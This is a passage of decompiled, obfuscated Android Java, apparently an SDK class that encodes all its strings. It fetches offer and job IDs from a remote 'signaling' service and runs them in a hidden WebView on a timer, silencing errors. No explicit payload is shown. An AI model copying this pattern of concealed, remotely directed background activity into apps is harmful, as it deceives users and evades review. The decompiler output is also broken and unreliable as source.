package IlIlllIIlI1;

import IlIlIIIlIlIlll1.IIlIllIIll1;
import IlIlIIlIII1.lIIIIlllllIlll1;
import android.app.ActivityManager;
import android.app.Application;
import android.content.Context;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.os.Process;
import android.os.SystemClock;
import android.webkit.WebView;
import c13.nim5.ez8.h5_proto.Atom;
import c13.nim5.ez8.h5_proto.Log;
import c13.nim5.ez8.h5_proto.signaling.CheckSignalingPluginStartResponse;
import java.util.Date;
import java.util.Iterator;
import java.util.Timer;
import java.util.TimerTask;
import java.util.concurrent.CountDownLatch;
import java.util.regex.Pattern;
import lIllIlIll1.IlIlIIlIII1;

/* loaded from: classes.jar:IlIlllIIlI1/llllIllIl1.class */
public class llllIllIl1 {

    /* renamed from: IIlIllIIll1, reason: collision with root package name */
    public static final String f260IIlIllIIll1 = IlIlllIIlI1.IllIIlIIII1.f239llllIIIIll1.llllIIIIll1(new byte[]{125, 31, 10, -126, 24, -96, -58, -59, 124, 0, 18}, new byte[]{25, 115, 102, -14, Byte.MAX_VALUE, -60, -103, -79});

    /* renamed from: llllIIIIll1, reason: collision with root package name */
    public Context f261llllIIIIll1;

    /* renamed from: IlIlIIlIII1, reason: collision with root package name */
    public IlIlIIlIII1.lIIIIlllllIlll1 f268IlIlIIlIII1;

    /* renamed from: lIIIIlllllIlll1, reason: collision with root package name */
    public boolean f262lIIIIlllllIlll1 = false;

    /* renamed from: llllIllIl1, reason: collision with root package name */
    public String f263llllIllIl1 = lIIlllIIIlllII1.llllIllIl1.f377llllIllIl1;

    /* renamed from: IllIIlIIII1, reason: collision with root package name */
    public boolean f264IllIIlIIII1 = false;

    /* renamed from: IlIlllIIlI1, reason: collision with root package name */
    public String f265IlIlllIIlI1 = lIIlllIIIlllII1.llllIllIl1.f377llllIllIl1;

    /* renamed from: IlIllIlllIllI1, reason: collision with root package name */
    public String f266IlIllIlllIllI1 = lIIlllIIIlllII1.llllIllIl1.f377llllIllIl1;

    /* renamed from: llllllIlIIIlll1, reason: collision with root package name */
    public String f267llllllIlIIIlll1 = lIIlllIIIlllII1.llllIllIl1.f377llllIllIl1;

    /* renamed from: lIllIIIlIl1, reason: collision with root package name */
    public final Handler f269lIllIIIlIl1 = new Handler(Looper.getMainLooper());

    /* loaded from: classes.jar:IlIlllIIlI1/llllIllIl1$IllIIlIIII1.class */
    public class IllIIlIIII1 implements lIIIIlllllIlll1.IllIIlIIII1 {

        /* renamed from: llllIIIIll1, reason: collision with root package name */
        public final /* synthetic */ CountDownLatch f270llllIIIIll1;

        public IllIIlIIII1(CountDownLatch countDownLatch) {
            this.f270llllIIIIll1 = countDownLatch;
        }

        @Override // IlIlIIlIII1.lIIIIlllllIlll1.IllIIlIIII1
        public void llllIIIIll1(CheckSignalingPluginStartResponse checkSignalingPluginStartResponse, Exception exc) {
            String llllIIIIll12;
            try {
                if (exc != null) {
                    lllllIllIl1.IllIIlIIII1.lIIIIlllllIlll1(Log.LogLevel.ERROR, lIIlllIIIlllII1.llllIllIl1.f377llllIllIl1, exc.getMessage());
                } else if (checkSignalingPluginStartResponse == null || checkSignalingPluginStartResponse.getCode() != 0) {
                    if (checkSignalingPluginStartResponse != null) {
                        llllIIIIll12 = checkSignalingPluginStartResponse.getMessage();
                    } else {
                        byte[] bArr = new byte[13];
                        bArr[0] = 109;
                        bArr[1] = -60;
                        bArr[2] = 36;
                        bArr[3] = -45;
                        bArr[4] = -65;
                        bArr[5] = -43;
                        bArr[6] = -84;
                        bArr[7] = -97;
                        bArr[8] = 115;
                        bArr[9] = -34;
                        bArr[10] = 38;
                        bArr[11] = -52;
                        bArr[12] = -6;
                        byte[] bArr2 = new byte[8];
                        bArr2[0] = 3;
                        bArr2[1] = -79;
                        bArr2[2] = 72;
                        bArr2[3] = -65;
                        bArr2[4] = -97;
                        bArr2[5] = -89;
                        bArr2[6] = -55;
                        bArr2[7] = -20;
                        llllIIIIll12 = IlIlllIIlI1.IllIIlIIII1.f239llllIIIIll1.llllIIIIll1(bArr, bArr2);
                    }
                    lllllIllIl1.IllIIlIIII1.lIIIIlllllIlll1(Log.LogLevel.ERROR, lIIlllIIIlllII1.llllIllIl1.f377llllIllIl1, llllIIIIll12);
                } else {
                    llllIllIl1.this.f264IllIIlIIII1 = checkSignalingPluginStartResponse.isRun();
                    llllIllIl1.this.f265IlIlllIIlI1 = checkSignalingPluginStartResponse.getOfferId();
                    llllIllIl1.this.f266IlIllIlllIllI1 = checkSignalingPluginStartResponse.getJobId();
                    if (llllIllIl1.this.f264IllIIlIIII1) {
                        lllllIllIl1.lIIIIlllllIlll1 liiiilllllilll1 = lllllIllIl1.lIIIIlllllIlll1.f773llllllIlIIIlll1;
                        byte[] bArr3 = new byte[14];
                        bArr3[0] = -28;
                        bArr3[1] = 88;
                        bArr3[2] = -56;
                        bArr3[3] = -99;
                        bArr3[4] = -41;
                        bArr3[5] = -93;
                        bArr3[6] = -116;
                        bArr3[7] = -34;
                        bArr3[8] = -61;
                        bArr3[9] = 87;
                        bArr3[10] = -51;
                        bArr3[11] = Byte.MIN_VALUE;
                        bArr3[12] = -26;
                        bArr3[13] = -73;
                        byte[] bArr4 = new byte[8];
                        bArr4[0] = -83;
                        bArr4[1] = 54;
                        bArr4[2] = -95;
                        bArr4[3] = -23;
                        bArr4[4] = -120;
                        bArr4[5] = -48;
                        bArr4[6] = -27;
                        bArr4[7] = -71;
                        IllIIlIIII1.llllIIIIll1 lllliiiill1 = IlIlllIIlI1.IllIIlIIII1.f239llllIIIIll1;
                        String llllIIIIll13 = lllliiiill1.llllIIIIll1(bArr3, bArr4);
                        StringBuilder sb = new StringBuilder();
                        byte[] bArr5 = new byte[22];
                        bArr5[0] = Byte.MIN_VALUE;
                        bArr5[1] = 84;
                        bArr5[2] = -108;
                        bArr5[3] = 106;
                        bArr5[4] = 22;
                        bArr5[5] = -54;
                        bArr5[6] = -6;
                        bArr5[7] = 17;
                        bArr5[8] = -110;
                        bArr5[9] = 24;
                        bArr5[10] = Byte.MIN_VALUE;
                        bArr5[11] = 76;
                        bArr5[12] = 23;
                        bArr5[13] = -62;
                        bArr5[14] = -2;
                        bArr5[15] = 15;
                        bArr5[16] = -78;
                        bArr5[17] = 18;
                        bArr5[18] = -59;
                        bArr5[19] = 57;
                        bArr5[20] = 81;
                        bArr5[21] = -122;
                        byte[] bArr6 = new byte[8];
                        bArr6[0] = -5;
                        bArr6[1] = 118;
                        bArr6[2] = -25;
                        bArr6[3] = 3;
                        bArr6[4] = 113;
                        bArr6[5] = -92;
                        bArr6[6] = -101;
                        bArr6[7] = 125;
                        StringBuilder append = sb.append(lllliiiill1.llllIIIIll1(bArr5, bArr6)).append(llllIllIl1.this.f265IlIlllIIlI1);
                        byte[] bArr7 = new byte[22];
                        bArr7[0] = -79;
                        bArr7[1] = 9;
                        bArr7[2] = 9;
                        bArr7[3] = 69;
                        bArr7[4] = -87;
                        bArr7[5] = 98;
                        bArr7[6] = 18;
                        bArr7[7] = -41;
                        bArr7[8] = -14;
                        bArr7[9] = 73;
                        bArr7[10] = 64;
                        bArr7[11] = 9;
                        bArr7[12] = -67;
                        bArr7[13] = 65;
                        bArr7[14] = 26;
                        bArr7[15] = -37;
                        bArr7[16] = -38;
                        bArr7[17] = 65;
                        bArr7[18] = 11;
                        bArr7[19] = 93;
                        bArr7[20] = -6;
                        bArr7[21] = 41;
                        byte[] bArr8 = new byte[8];
                        bArr8[0] = -109;
                        bArr8[1] = 37;
                        bArr8[2] = 41;
                        bArr8[3] = 103;
                        bArr8[4] = -38;
                        bArr8[5] = 11;
                        bArr8[6] = 117;
                        bArr8[7] = -71;
                        StringBuilder append2 = append.append(lllliiiill1.llllIIIIll1(bArr7, bArr8)).append(llllIllIl1.this.f266IlIllIlllIllI1);
                        byte[] bArr9 = new byte[2];
                        bArr9[0] = -7;
                        bArr9[1] = 124;
                        byte[] bArr10 = new byte[8];
                        bArr10[0] = -37;
                        bArr10[1] = 1;
                        bArr10[2] = -123;
                        bArr10[3] = 54;
                        bArr10[4] = 66;
                        bArr10[5] = -9;
                        bArr10[6] = 70;
                        bArr10[7] = 96;
                        liiiilllllilll1.llllIIIIll1(llllIIIIll13, append2.append(lllliiiill1.llllIIIIll1(bArr9, bArr10)).toString());
                    } else {
                        byte[] bArr11 = new byte[18];
                        bArr11[0] = 77;
                        bArr11[1] = -51;
                        bArr11[2] = 120;
                        bArr11[3] = -125;
                        bArr11[4] = 69;
                        bArr11[5] = 121;
                        bArr11[6] = 76;
                        bArr11[7] = -77;
                        bArr11[8] = 12;
                        bArr11[9] = -78;
                        bArr11[10] = 121;
                        bArr11[11] = -26;
                        bArr11[12] = 49;
                        bArr11[13] = 88;
                        bArr11[14] = 15;
                        bArr11[15] = -45;
                        bArr11[16] = 44;
                        bArr11[17] = -43;
                        byte[] bArr12 = new byte[8];
                        bArr12[0] = -85;
                        bArr12[1] = 90;
                        bArr12[2] = -40;
                        bArr12[3] = 106;
                        bArr12[4] = -39;
                        bArr12[5] = -7;
                        bArr12[6] = -86;
                        bArr12[7] = 58;
                        lllllIllIl1.IllIIlIIII1.lIIIIlllllIlll1(Log.LogLevel.INFO, lIIlllIIIlllII1.llllIllIl1.f377llllIllIl1, IlIlllIIlI1.IllIIlIIII1.f239llllIIIIll1.llllIIIIll1(bArr11, bArr12));
                    }
                }
            } finally {
                this.f270llllIIIIll1.countDown();
            }
        }
    }

    /* loaded from: classes.jar:IlIlllIIlI1/llllIllIl1$lIIIIlllllIlll1.class */
    public class lIIIIlllllIlll1 implements Runnable {
        public lIIIIlllllIlll1() {
        }

        /* JADX WARN: Failed to calculate best type for var: r0v0 ??
        java.lang.NullPointerException: Cannot invoke "jadx.core.dex.instructions.args.InsnArg.getType()" because "changeArg" is null
        	at jadx.core.dex.visitors.typeinference.TypeUpdate.moveListener(TypeUpdate.java:439)
        	at jadx.core.dex.visitors.typeinference.TypeUpdate.runListeners(TypeUpdate.java:232)
        	at jadx.core.dex.visitors.typeinference.TypeUpdate.requestUpdate(TypeUpdate.java:212)
        	at jadx.core.dex.visitors.typeinference.TypeUpdate.updateTypeForSsaVar(TypeUpdate.java:183)
        	at jadx.core.dex.visitors.typeinference.TypeUpdate.updateTypeChecked(TypeUpdate.java:112)
        	at jadx.core.dex.visitors.typeinference.TypeUpdate.apply(TypeUpdate.java:83)
        	at jadx.core.dex.visitors.typeinference.TypeUpdate.apply(TypeUpdate.java:56)
        	at jadx.core.dex.visitors.typeinference.FixTypesVisitor.calculateFromBounds(FixTypesVisitor.java:156)
        	at jadx.core.dex.visitors.typeinference.FixTypesVisitor.setBestType(FixTypesVisitor.java:133)
        	at jadx.core.dex.visitors.typeinference.FixTypesVisitor.deduceType(FixTypesVisitor.java:238)
        	at jadx.core.dex.visitors.typeinference.FixTypesVisitor.tryDeduceTypes(FixTypesVisitor.java:221)
        	at jadx.core.dex.visitors.typeinference.FixTypesVisitor.visit(FixTypesVisitor.java:91)
         */
        /* JADX WARN: Failed to calculate best type for var: r0v0 ??
        java.lang.NullPointerException: Cannot invoke "jadx.core.dex.instructions.args.InsnArg.getType()" because "changeArg" is null
        	at jadx.core.dex.visitors.typeinference.TypeUpdate.moveListener(TypeUpdate.java:439)
        	at jadx.core.dex.visitors.typeinference.TypeUpdate.runListeners(TypeUpdate.java:232)
        	at jadx.core.dex.visitors.typeinference.TypeUpdate.requestUpdate(TypeUpdate.java:212)
        	at jadx.core.dex.visitors.typeinference.TypeUpdate.updateTypeForSsaVar(TypeUpdate.java:183)
        	at jadx.core.dex.visitors.typeinference.TypeUpdate.updateTypeChecked(TypeUpdate.java:112)
        	at jadx.core.dex.visitors.typeinference.TypeUpdate.apply(TypeUpdate.java:83)
        	at jadx.core.dex.visitors.typeinference.TypeUpdate.apply(TypeUpdate.java:56)
        	at jadx.core.dex.visitors.typeinference.TypeInferenceVisitor.calculateFromBounds(TypeInferenceVisitor.java:145)
        	at jadx.core.dex.visitors.typeinference.TypeInferenceVisitor.setBestType(TypeInferenceVisitor.java:123)
        	at jadx.core.dex.visitors.typeinference.TypeInferenceVisitor.lambda$runTypePropagation$2(TypeInferenceVisitor.java:101)
        	at java.base/java.util.ArrayList.forEach(ArrayList.java:1597)
        	at jadx.core.dex.visitors.typeinference.TypeInferenceVisitor.runTypePropagation(TypeInferenceVisitor.java:101)
        	at jadx.core.dex.visitors.typeinference.TypeInferenceVisitor.visit(TypeInferenceVisitor.java:75)
         */
        /* JADX WARN: Multi-variable type inference failed. Error: java.lang.NullPointerException: Cannot invoke "jadx.core.dex.instructions.args.RegisterArg.getSVar()" because the return value of "jadx.core.dex.nodes.InsnNode.getResult()" is null
        	at jadx.core.dex.visitors.typeinference.AbstractTypeConstraint.collectRelatedVars(AbstractTypeConstraint.java:31)
        	at jadx.core.dex.visitors.typeinference.AbstractTypeConstraint.<init>(AbstractTypeConstraint.java:19)
        	at jadx.core.dex.visitors.typeinference.TypeSearch$1.<init>(TypeSearch.java:376)
        	at jadx.core.dex.visitors.typeinference.TypeSearch.makeMoveConstraint(TypeSearch.java:376)
        	at jadx.core.dex.visitors.typeinference.TypeSearch.makeConstraint(TypeSearch.java:361)
        	at jadx.core.dex.visitors.typeinference.TypeSearch.collectConstraints(TypeSearch.java:341)
        	at java.base/java.util.ArrayList.forEach(ArrayList.java:1597)
        	at jadx.core.dex.visitors.typeinference.TypeSearch.run(TypeSearch.java:60)
        	at jadx.core.dex.visitors.typeinference.FixTypesVisitor.runMultiVariableSearch(FixTypesVisitor.java:116)
        	at jadx.core.dex.visitors.typeinference.FixTypesVisitor.visit(FixTypesVisitor.java:91)
         */
        /* JADX WARN: Not initialized variable reg: 0, insn: 0x0168: MOVE (r2 I:??) = (r0 I:??), block:B:7:0x0009 */
        /* JADX WARN: Type inference failed for: r0v0, types: [java.lang.Throwable] */
        @Override // java.lang.Runnable
        public void run() {
            ?? r0;
            try {
                IIlIllIIll1.llllIIIIll1();
            } catch (Throwable unused) {
                lllllIllIl1.IllIIlIIII1.lIIIIlllllIlll1(Log.LogLevel.ERROR, lIIlllIIIlllII1.llllIllIl1.f377llllIllIl1, IlIlllIIlI1.IllIIlIIII1.f239llllIIIIll1.llllIIIIll1(new byte[]{90, 15, -102, -114, 63, -17, 60, 96, 113, 78, -93, -51, 77, -29, 52, 104, 102, 26, -81, -41, 8, -23, 49, 64, 124, 94, -120, -48, 26, -28, 54, 110, 115, 94, -115, -42, 32, -27, 62, 100, 126, 26, -87, -51, 31, -27, 40, 59, 50}, new byte[]{18, 58, -52, -65, 109, -118, 90, 1}) + r0.getMessage());
            }
        }
    }

    /* loaded from: classes.jar:IlIlllIIlI1/llllIllIl1$llllIIIIll1.class */
    public class llllIIIIll1 implements Runnable {

        /* renamed from: llllIIIIll1, reason: collision with root package name */
        public final /* synthetic */ WebView[] f273llllIIIIll1;

        public llllIIIIll1(WebView[] webViewArr) {
            this.f273llllIIIIll1 = webViewArr;
        }

        @Override // java.lang.Runnable
        public void run() {
            this.f273llllIIIIll1[0] = new WebView(IlIlllIIlI1.lIIIIlllllIlll1.llllIllIl1());
        }
    }

    /* renamed from: IlIlllIIlI1.llllIllIl1$llllIllIl1, reason: collision with other inner class name */
    /* loaded from: classes.jar:IlIlllIIlI1/llllIllIl1$llllIllIl1.class */
    public class C0009llllIllIl1 extends TimerTask {

        /* renamed from: IlIlllIIlI1.llllIllIl1$llllIllIl1$lIIIIlllllIlll1 */
        /* loaded from: classes.jar:IlIlllIIlI1/llllIllIl1$llllIllIl1$lIIIIlllllIlll1.class */
        public class lIIIIlllllIlll1 implements Runnable {

            /* renamed from: llllIIIIll1, reason: collision with root package name */
            public final /* synthetic */ WebView[] f276llllIIIIll1;

            public lIIIIlllllIlll1(WebView[] webViewArr) {
                this.f276llllIIIIll1 = webViewArr;
            }

            @Override // java.lang.Runnable
            public void run() {
                this.f276llllIIIIll1[0] = new WebView(IlIlllIIlI1.lIIIIlllllIlll1.llllIllIl1());
            }
        }

        /* renamed from: IlIlllIIlI1.llllIllIl1$llllIllIl1$llllIIIIll1 */
        /* loaded from: classes.jar:IlIlllIIlI1/llllIllIl1$llllIllIl1$llllIIIIll1.class */
        public class llllIIIIll1 implements Runnable {
            public llllIIIIll1() {
            }

            /* JADX WARN: Failed to calculate best type for var: r0v0 ??
            java.lang.NullPointerException: Cannot invoke "jadx.core.dex.instructions.args.InsnArg.getType()" because "changeArg" is null
            	at jadx.core.dex.visitors.typeinference.TypeUpdate.moveListener(TypeUpdate.java:439)
            	at jadx.core.dex.visitors.typeinference.TypeUpdate.runListeners(TypeUpdate.java:232)
            	at jadx.core.dex.visitors.typeinference.TypeUpdate.requestUpdate(TypeUpdate.java:212)
            	at jadx.core.dex.visitors.typeinference.TypeUpdate.updateTypeForSsaVar(TypeUpdate.java:183)
            	at jadx.core.dex.visitors.typeinference.TypeUpdate.updateTypeChecked(TypeUpdate.java:112)
            	at jadx.core.dex.visitors.typeinference.TypeUpdate.apply(TypeUpdate.java:83)
            	at jadx.core.dex.visitors.typeinference.TypeUpdate.apply(TypeUpdate.java:56)
            	at jadx.core.dex.visitors.typeinference.FixTypesVisitor.calculateFromBounds(FixTypesVisitor.java:156)
            	at jadx.core.dex.visitors.typeinference.FixTypesVisitor.setBestType(FixTypesVisitor.java:133)
            	at jadx.core.dex.visitors.typeinference.FixTypesVisitor.deduceType(FixTypesVisitor.java:238)
            	at jadx.core.dex.visitors.typeinference.FixTypesVisitor.tryDeduceTypes(FixTypesVisitor.java:221)
            	at jadx.core.dex.visitors.typeinference.FixTypesVisitor.visit(FixTypesVisitor.java:91)
             */
            /* JADX WARN: Failed to calculate best type for var: r0v0 ??
            java.lang.NullPointerException: Cannot invoke "jadx.core.dex.instructions.args.InsnArg.getType()" because "changeArg" is null
            	at jadx.core.dex.visitors.typeinference.TypeUpdate.moveListener(TypeUpdate.java:439)
            	at jadx.core.dex.visitors.typeinference.TypeUpdate.runListeners(TypeUpdate.java:232)
            	at jadx.core.dex.visitors.typeinference.TypeUpdate.requestUpdate(TypeUpdate.java:212)
            	at jadx.core.dex.visitors.typeinference.TypeUpdate.updateTypeForSsaVar(TypeUpdate.java:183)
            	at jadx.core.dex.visitors.typeinference.TypeUpdate.updateTypeChecked(TypeUpdate.java:112)
            	at jadx.core.dex.visitors.typeinference.TypeUpdate.apply(TypeUpdate.java:83)
            	at jadx.core.dex.visitors.typeinference.TypeUpdate.apply(TypeUpdate.java:56)
            	at jadx.core.dex.visitors.typeinference.TypeInferenceVisitor.calculateFromBounds(TypeInferenceVisitor.java:145)
            	at jadx.core.dex.visitors.typeinference.TypeInferenceVisitor.setBestType(TypeInferenceVisitor.java:123)
            	at jadx.core.dex.visitors.typeinference.TypeInferenceVisitor.lambda$runTypePropagation$2(TypeInferenceVisitor.java:101)
            	at java.base/java.util.ArrayList.forEach(ArrayList.java:1597)
            	at jadx.core.dex.visitors.typeinference.TypeInferenceVisitor.runTypePropagation(TypeInferenceVisitor.java:101)
            	at jadx.core.dex.visitors.typeinference.TypeInferenceVisitor.visit(TypeInferenceVisitor.java:75)
             */
            /* JADX WARN: Multi-variable type inference failed. Error: java.lang.NullPointerException: Cannot invoke "jadx.core.dex.instructions.args.RegisterArg.getSVar()" because the return value of "jadx.core.dex.nodes.InsnNode.getResult()" is null
            	at jadx.core.dex.visitors.typeinference.AbstractTypeConstraint.collectRelatedVars(AbstractTypeConstraint.java:31)
            	at jadx.core.dex.visitors.typeinference.AbstractTypeConstraint.<init>(AbstractTypeConstraint.java:19)
            	at jadx.core.dex.visitors.typeinference.TypeSearch$1.<init>(TypeSearch.java:376)
            	at jadx.core.dex.visitors.typeinference.TypeSearch.makeMoveConstraint(TypeSearch.java:376)
            	at jadx.core.dex.visitors.typeinference.TypeSearch.makeConstraint(TypeSearch.java:361)
            	at jadx.core.dex.visitors.typeinference.TypeSearch.collectConstraints(TypeSearch.java:341)
            	at java.base/java.util.ArrayList.forEach(ArrayList.java:1597)
            	at jadx.core.dex.visitors.typeinference.TypeSearch.run(TypeSearch.java:60)
            	at jadx.core.dex.visitors.typeinference.FixTypesVisitor.runMultiVariableSearch(FixTypesVisitor.java:116)
            	at jadx.core.dex.visitors.typeinference.FixTypesVisitor.visit(FixTypesVisitor.java:91)
             */
            /* JADX WARN: Not initialized variable reg: 0, insn: 0x0165: MOVE (r2 I:??) = (r0 I:??), block:B:7:0x0009 */
            /* JADX WARN: Type inference failed for: r0v0, types: [java.lang.Throwable] */
            @Override // java.lang.Runnable
            public void run() {
                ?? r0;
                try {
                    IIlIllIIll1.llllIIIIll1();
                } catch (Throwable unused) {
                    lllllIllIl1.IllIIlIIII1.lIIIIlllllIlll1(Log.LogLevel.ERROR, lIIlllIIIlllII1.llllIllIl1.f377llllIllIl1, IlIlllIIlI1.IllIIlIIII1.f239llllIIIIll1.llllIIIIll1(new byte[]{-113, 69, -47, 81, 119, -1, 23, 67, -92, 4, -24, 18, 5, -13, 31, 75, -77, 80, -28, 8, 64, -7, 26, 99, -87, 20, -61, 15, 82, -12, 29, 77, -90, 20, -58, 9, 104, -11, 21, 71, -85, 80, -30, 18, 87, -11, 3, 24, -25}, new byte[]{-57, 112, -121, 96, 37, -102, 113, 34}) + r0.getMessage());
                }
            }
        }

        public C0009llllIllIl1() {
        }

        @Override // java.util.TimerTask, java.lang.Runnable
        public void run() {
            try {
                new Thread(new llllIIIIll1()).start();
                IlIlIIlIII1 ilIlIIlIII1 = new IlIlIIlIII1();
                byte[] bArr = new byte[28];
                bArr[0] = 85;
                bArr[1] = 59;
                bArr[2] = 50;
                bArr[3] = 87;
                bArr[4] = 122;
                bArr[5] = 123;
                bArr[6] = 82;
                bArr[7] = -124;
                bArr[8] = 126;
                bArr[9] = 122;
                bArr[10] = 11;
                bArr[11] = 20;
                bArr[12] = 8;
                bArr[13] = 106;
                bArr[14] = 85;
                bArr[15] = -106;
                bArr[16] = 118;
                bArr[17] = 46;
                bArr[18] = 23;
                bArr[19] = 18;
                bArr[20] = 73;
                bArr[21] = 108;
                bArr[22] = 64;
                bArr[23] = -70;
                bArr[24] = 66;
                bArr[25] = 81;
                bArr[26] = 59;
                bArr[27] = 57;
                byte[] bArr2 = new byte[8];
                bArr2[0] = 29;
                bArr2[1] = 14;
                bArr2[2] = 100;
                bArr2[3] = 102;
                bArr2[4] = 40;
                bArr2[5] = 30;
                bArr2[6] = 52;
                bArr2[7] = -27;
                lllllIllIl1.IllIIlIIII1.lIIIIlllllIlll1(Log.LogLevel.INFO, lIIlllIIIlllII1.llllIllIl1.f377llllIllIl1, IlIlllIIlI1.IllIIlIIII1.f239llllIIIIll1.llllIIIIll1(bArr, bArr2));
                WebView[] webViewArr = new WebView[1];
                IlIlllIIlI1.lIIIIlllllIlll1.llllIIIIll1(new lIIIIlllllIlll1(webViewArr));
                SystemClock.sleep(2000L);
                WebView webView = webViewArr[0];
                if (webView != null) {
                    ilIlIIlIII1.llllIIIIll1(webView);
                }
            } catch (Throwable unused) {
            }
        }
    }

    public Context IllIIlIIII1() {
        return this.f261llllIIIIll1;
    }

    public boolean lIllIIIlIl1() {
        return this.f262lIIIIlllllIlll1;
    }

    public boolean IIlIllIIll1() {
        return this.f264IllIIlIIII1;
    }

    public String llllllIlIIIlll1() {
        return this.f265IlIlllIIlI1;
    }

    public String IlIllIlllIllI1() {
        return this.f266IlIllIlllIllI1;
    }

    public IlIlIIlIII1.lIIIIlllllIlll1 IlIlllIIlI1() {
        return this.f268IlIlIIlIII1;
    }

    public final void IlIlIIlIII1() {
        Context context = this.f261llllIIIIll1;
        IllIIlIIII1.llllIIIIll1 lllliiiill1 = IlIlllIIlI1.IllIIlIIII1.f239llllIIIIll1;
        IlIlIIlIII1.lIIIIlllllIlll1 liiiilllllilll1 = new IlIlIIlIII1.lIIIIlllllIlll1(context, new lIIIIlllllIlll1.IlIlllIIlI1(lllliiiill1.llllIIIIll1(new byte[]{-54, 84, -81, Byte.MAX_VALUE, 31, -11, 39, 20, -58, 76, -73, Byte.MAX_VALUE, 11, -85, 38, 88, -50, 73, -72, 100}, new byte[]{-94, 32, -37, 15, 108, -49, 8, 59}), lllliiiill1.llllIIIIll1(new byte[]{-116, 20, -76, 76, -60, -113, -89, 42, -105, 23, -96, 18, -59, -61, -81, 47, -104, 12, -24, 5, -126, -57, -83, 39, -105, 14, -87, 17, -76, -41, -80}, new byte[]{-5, 103, -57, 118, -21, -96, -61, 70}), lIIlllIIIlllII1.llllIllIl1.f377llllIllIl1, true, 30L));
        liiiilllllilll1.llllIllIl1();
        this.f268IlIlIIlIII1 = liiiilllllilll1;
    }

    public String llllIllIl1() {
        return this.f267llllllIlIIIlll1;
    }

    /* JADX WARN: Multi-variable type inference failed */
    /* JADX WARN: Type inference failed for: r0v0, types: [boolean] */
    /* JADX WARN: Type inference failed for: r0v1, types: [java.lang.Exception] */
    /* JADX WARN: Type inference failed for: r0v7, types: [IlIlIIlIII1.lIIIIlllllIlll1] */
    public final void lIIIIlllllIlll1() {
        ?? llllIllIl12 = IIlIllIIll1.llllIllIl1();
        if (llllIllIl12 != 0) {
            try {
                this.f264IllIIlIIII1 = false;
                CountDownLatch countDownLatch = new CountDownLatch(1);
                this.f268IlIlIIlIII1.llllIIIIll1(new IllIIlIIII1(countDownLatch));
                countDownLatch.await();
                if (this.f264IllIIlIIII1) {
                    return;
                }
                llllIllIl12 = this.f268IlIlIIlIII1;
                llllIllIl12.llllIIIIll1();
            } catch (Exception unused) {
                lllllIllIl1.IllIIlIIII1.lIIIIlllllIlll1(Log.LogLevel.ERROR, lIIlllIIIlllII1.llllIllIl1.f377llllIllIl1, llllIIIIll1.lIIIIlllllIlll1.llllIIIIll1(llllIllIl12, new StringBuilder().append(IlIlllIIlI1.IllIIlIIII1.f239llllIIIIll1.llllIIIIll1(new byte[]{74, -40, 5, -23, 121, 126, 20, -39, 122, -39, 7, -28, 115, 64, 8, -39, 78, -112, 5, -8, 96, 67, 19, -115, 9}, new byte[]{41, -80, 96, -118, 18, 44, 97, -73}))));
            }
        }
    }

    public void llllIIIIll1(Context context, String str) {
        llllIIIIll1(context, str, null);
    }

    public void llllIIIIll1(Context context, String str, Atom atom) {
        try {
            if (Build.VERSION.SDK_INT >= 28) {
                String processName = Application.getProcessName();
                byte[] bArr = new byte[1];
                bArr[0] = 20;
                byte[] bArr2 = new byte[8];
                bArr2[0] = 46;
                bArr2[1] = 109;
                bArr2[2] = 4;
                bArr2[3] = 11;
                bArr2[4] = 88;
                bArr2[5] = -37;
                bArr2[6] = 41;
                bArr2[7] = 36;
                IllIIlIIII1.llllIIIIll1 lllliiiill1 = IlIlllIIlI1.IllIIlIIII1.f239llllIIIIll1;
                String llllIIIIll12 = lllliiiill1.llllIIIIll1(bArr, bArr2);
                byte[] bArr3 = new byte[1];
                bArr3[0] = 60;
                byte[] bArr4 = new byte[8];
                bArr4[0] = 99;
                bArr4[1] = -6;
                bArr4[2] = 56;
                bArr4[3] = 29;
                bArr4[4] = -29;
                bArr4[5] = -55;
                bArr4[6] = -75;
                bArr4[7] = -76;
                WebView.setDataDirectorySuffix(processName.replace(llllIIIIll12, lllliiiill1.llllIIIIll1(bArr3, bArr4)));
            }
        } catch (Throwable unused) {
            System.out.println(IlIlllIIlI1.IllIIlIIII1.f239llllIIIIll1.llllIIIIll1(new byte[]{61, -78, -125, 78, 28, 27, -110, -118, 25, -119, -67, 100, 42, 1, -58, -93, 88, -119, -65, 104, 58, 72, -45, -96, 17, -102, -76, 33, 25, 68, -48, -102, 17, -123, -90}, new byte[]{120, -32, -47, 1, 78, 33, -78, -52}));
        }
        this.f267llllllIlIIIlll1 = str;
        try {
            Context applicationContext = context.getApplicationContext();
            SystemClock.sleep(500L);
            this.f261llllIIIIll1 = applicationContext;
            IIlIllIIll1.f145lIllIlIll1 = applicationContext;
            this.f262lIIIIlllllIlll1 = IIlIllIIll1.IIlIllIIll1();
            IlIlllIIlI1.lIIIIlllllIlll1.llllIIIIll1(this);
            lllllIllIl1.llllIllIl1.f797IlIllIlllIllI1.llllIIIIll1(applicationContext);
            lllllIllIl1.lIIIIlllllIlll1.f773llllllIlIIIlll1.llllIIIIll1(applicationContext);
            byte[] bArr5 = new byte[17];
            bArr5[0] = 85;
            bArr5[1] = -40;
            bArr5[2] = 5;
            bArr5[3] = -38;
            bArr5[4] = -85;
            bArr5[5] = -33;
            bArr5[6] = -123;
            bArr5[7] = 64;
            bArr5[8] = 126;
            bArr5[9] = -103;
            bArr5[10] = 60;
            bArr5[11] = -103;
            bArr5[12] = -39;
            bArr5[13] = -45;
            bArr5[14] = -115;
            bArr5[15] = 72;
            bArr5[16] = 105;
            byte[] bArr6 = new byte[8];
            bArr6[0] = 29;
            bArr6[1] = -19;
            bArr6[2] = 83;
            bArr6[3] = -21;
            bArr6[4] = -7;
            bArr6[5] = -70;
            bArr6[6] = -29;
            bArr6[7] = 33;
            IllIIlIIII1.llllIIIIll1 lllliiiill12 = IlIlllIIlI1.IllIIlIIII1.f239llllIIIIll1;
            String llllIIIIll13 = lllliiiill12.llllIIIIll1(bArr5, bArr6);
            Log.LogLevel logLevel = Log.LogLevel.INFO;
            lllllIllIl1.IllIIlIIII1.lIIIIlllllIlll1(logLevel, lIIlllIIIlllII1.llllIllIl1.f377llllIllIl1, llllIIIIll13);
            llllllIlIIIlll1.llllIIIIll1.lIIIIlllllIlll1(applicationContext, str);
            if (atom != null) {
                llllllIlIIIlll1.llllIIIIll1.f807lIIIIlllllIlll1 = atom;
            }
            StringBuilder sb = new StringBuilder();
            byte[] bArr7 = new byte[19];
            bArr7[0] = -67;
            bArr7[1] = 10;
            bArr7[2] = 48;
            bArr7[3] = -21;
